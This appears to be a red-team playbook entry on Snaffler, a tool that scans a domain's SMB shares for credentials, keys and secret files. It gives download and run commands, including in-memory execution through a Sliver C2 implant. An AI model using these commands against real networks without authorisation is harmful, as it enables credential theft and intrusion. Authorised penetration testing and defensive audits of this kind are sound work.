# 03.36 Snaffler

> File-share scanner that finds interesting files across <ORG>'s SMB shares — credentials, configs, secrets.

## Overview

Snaffler walks every SMB share you can access in <DOMAIN>, grepping for files matching configurable patterns: filenames (passwords.xlsx, config.yml, .env), file extensions (.kdbx, .pfx, .ovpn), file content (regex for keys, passwords, hostnames). Outputs ranked findings (red = high-confidence credential). Critical for finding the goldmine of forgotten credentials sitting on internal shares.

## Steps

- **Step 1** - Get binary.
- **Step 2** - Run from domain-joined host.
- **Step 3** - Review high-severity (red) findings first.

## Commands

### Get binary

```powershell
iwr 'https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe' -OutFile Snaffler.exe
```

### Default run

```powershell
Snaffler.exe -s -o snaff.log
# -s = also output to console; -o = write to log file
```

### Quieter — files only, no share roots

```powershell
Snaffler.exe -s -o snaff.log -t snaff.tsv -y -n .DS_Store,Thumbs.db,desktop.ini
```

### Specific share list

```powershell
Snaffler.exe -s -o snaff.log -i shares.txt
```

### Specific domain + DC

```powershell
Snaffler.exe -d <DOMAIN> -c <DC-FQDN> -s -o snaff.log
```

### Sliver execute-assembly

```text
[sliver] $ execute-assembly /opt/tools/Snaffler.exe -s -o C:\Windows\Temp\snaff.log
```
